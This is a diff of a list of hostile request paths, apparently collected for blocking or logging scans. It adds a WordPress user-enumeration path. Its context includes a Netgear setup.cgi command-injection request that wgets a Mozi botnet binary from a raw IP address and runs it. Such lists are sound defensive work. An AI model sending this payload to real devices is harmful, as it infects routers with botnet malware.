@@ -4174,3 +4174,4 @@ www.liveinternet.ru:443
 /wp-json/wp/v2/users/
 /?author=1
 /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://213.159.247.134:60548/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
+/wp-json/wp/v2/users
